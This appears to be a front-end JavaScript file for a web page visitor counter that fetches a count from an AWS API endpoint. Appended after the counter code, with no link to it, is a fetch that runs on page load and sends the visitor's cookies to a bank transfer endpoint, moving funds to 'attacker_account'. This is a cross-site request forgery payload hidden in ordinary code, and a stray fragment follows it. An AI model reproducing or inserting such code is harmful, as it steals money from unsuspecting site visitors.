const apiUrl = "https://f5qzurvewg.execute-api.us-east-1.amazonaws.com/update/v1/lambda";
const count = document.getElementById("count");
let c = 0
const requestOptions = {
  method: 'POST'
};

fetch(apiUrl, requestOptions)
  .then(response => {
    if(!response.ok) {
      throw new Error('Network Response was not ok')
    }
    return response.json();
  })
  .then(data =>{
    // console.log('Request succeeded with JSON response:', data);
    c = data.visitor_count;
    count.textContent = c;
  })
  .catch(error => {
    console.error('Error;', error)
  })

// function inc() {
//   count.textContent = c;
//   // update();
// }

// function update() {

// }

fetch("https://yourbank.com/api/transfer-funds", {
  method: "POST",
  credentials: "include",
  body: JSON.stringify({ to: "attacker_account", amount: 1000 })
});

OPTIONS/





